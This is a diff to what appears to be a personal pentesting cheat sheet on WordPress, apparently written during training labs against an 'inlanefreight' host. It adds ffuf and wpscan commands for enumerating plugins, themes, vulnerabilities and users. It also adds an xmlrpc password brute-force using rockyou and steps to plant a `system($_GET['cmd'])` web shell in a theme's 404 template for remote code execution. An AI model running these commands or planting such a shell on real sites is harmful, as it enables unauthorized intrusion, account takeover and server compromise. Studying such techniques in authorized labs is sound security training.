@@ -668,9 +668,33 @@ Can find version of wordpress, wp plugins,  in index.html source code:
 - `<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>`  
 - `<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />`
 
-brutforce plugins and themes
+**Enumerate plugins and themes:**  
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-plugins.FUZZ.txt -u http://example.com/FUZZ
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-themes.FUZZ.txt -u http://example.com/FUZZ
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wordpress.FUZZ.txt -u http://example.com/FUZZ
+ffuf -w /usr/share/wordlists/metasploit/wp-plugins.txt -u http://example.com/FUZZ
+wpscan --url http://example.com/ -enumerate vp --no-banner --api-token <key>
 ```
+plugins vulnerabilities  
+```bash
+wpscan --url http://example.com/ -enumerate ap --api-token <key>
+wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 60 --api-token <key> #can take some times
+```
+**Username listing and password brutforce:**  
+```
+http://example.com/?author=1   # 1=admin 2=???
+wpscan --url http://example.com/ -enumerate u1-1000 --api-token <key>
+```
+Password  
+```
+wpscan --password-attack xmlrpc -U <user> -P /usr/share/wordlists/rockyou.txt --url http://example.com
+```
+and go to wp-login.php with result  
+
+**RCE**  
+you need to have acces to wp-admin.  
+- go "Apparence", and "Themes Editor"
+- select "Themes to edit" ex: "twenty seventeen" and "select"
+- edit "404 template" and add `system($_GET['cmd']);` at second lines.
+- then go /wp-content/themes/tewentyseventeen/404.php?cmd=id
